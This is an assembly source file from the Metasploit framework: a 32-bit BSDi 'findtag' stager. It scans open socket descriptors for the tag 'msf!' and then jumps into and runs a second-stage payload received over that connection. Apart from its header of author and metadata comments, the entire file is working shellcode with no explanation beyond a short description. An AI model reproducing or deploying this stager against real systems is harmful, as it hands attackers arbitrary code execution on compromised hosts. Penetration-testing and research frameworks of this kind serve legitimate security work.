;;
; 
;        Name: stager_sock_find
;   Qualities: Can Have Null
;   Platforms: BSDi
;     Authors: skape <mmiller [at] hick.org>
;              optyx <optyx [at] uberhax0r.net>
;     Version: $Revision: 1633 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a BSDi tag based findsock TCP stager.
;
;        File descriptor in edi.
;
; Meta-Information:
;
; meta-shortname=BSDi FindTag Stager
; meta-description=Run a second stage from an established connection
; meta-authors=skape <mmiller [at] hick.org>
; meta-os=bsdi
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=findtag
; meta-name=find
; meta-basemod=Msf::PayloadComponent::FindConnection
; meta-offset-findtag=0x23
;;
BITS   32
GLOBAL _start

_start:

initialization:
	push 0xc3000700
	mov  eax, 0x9a
	cdq
	push eax
	mov  esi, esp

initialize_stack:
	push edx
	mov  esi, esp
	push byte 0x40
	mov  dh, 0xa
	push edx
	push esi
	push edx

findtag:
	inc  word [esp]
	push byte 0x66 ; XXX
	pop  eax
	call esi
	cmp  dword [esi], 0x2166736d ; tag: msf!
	jnz  findtag
	pop  edi

%ifndef USE_SINGLE_STAGE

	cld
	lodsd
	jmp  esi

%endif
